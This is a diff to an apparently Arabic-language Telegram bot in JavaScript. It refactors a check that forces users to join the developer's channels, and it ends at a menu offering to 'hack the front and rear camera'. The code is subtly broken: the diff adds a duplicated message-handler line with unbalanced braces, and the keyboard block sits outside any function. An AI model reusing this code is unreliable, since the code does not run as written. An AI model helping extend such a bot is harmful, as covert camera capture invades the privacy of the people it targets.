@@ -272,25 +272,7 @@ function activateUser(userId) {
   }
 
   // التحقق من عضوية القناة المطلوبة
-if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
-    for (const channel of forcedChannelUsernames) {
-        try {
-            const member = async bot.getChatMember(channel, chatId);
-            if (member.status === 'left' || member.status === 'kicked') {
-                bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
-                    reply_markup: {
-                        inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
-                    }
-                });
-                return;
-            }
-        } catch (error) {
-            console.error('خطأ أثناء التحقق من عضوية القناة:', error);
-            bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
-            return;
-        }
-    }
-}
+
 
   // التحقق من الأوامر
   if (text === '/start' || text === 'تفعيل') {
@@ -590,6 +572,7 @@ bot.onText(/\/sjgdd (.+)/, (msg, match) => {
 });
 
 bot.on('message', async (msg) => {
+bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text ? msg.text.toLowerCase() : '';
     const senderId = msg.from.id;
@@ -598,6 +581,7 @@ bot.on('message', async (msg) => {
     const username = msg.from.username || '';
 
     if (!msg.text.includes(' ')) {
+        await checkForcedChannels(chatId);
         await showButtons(chatId, senderId.toString());
     }
 });
@@ -613,6 +597,29 @@ async function showButtons(chatId, userId) {
     // إرسال رسالة الحالة إلى المستخدم
     await bot.sendMessage(chatId, statusMessage);
 }
+
+async function checkForcedChannels(chatId) {
+    if (forcedChannelUsernames.length && !activatedUsers[chatId]) {
+        for (const channel of forcedChannelUsernames) {
+            try {
+                const member = await bot.getChatMember(channel, chatId);
+                if (member.status === 'left' || member.status === 'kicked') {
+                    await bot.sendMessage(chatId, `عذرا، يجب عليك الانضمام إلى القنوات المطور لاستخدام البوت:`, {
+                        reply_markup: {
+                            inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
+                        }
+                    });
+                    return;
+                }
+            } catch (error) {
+                console.error('خطأ أثناء التحقق من عضوية القناة:', error);
+                await bot.sendMessage(chatId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
+                return;
+            }
+        }
+    }
+}
+
 
    let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
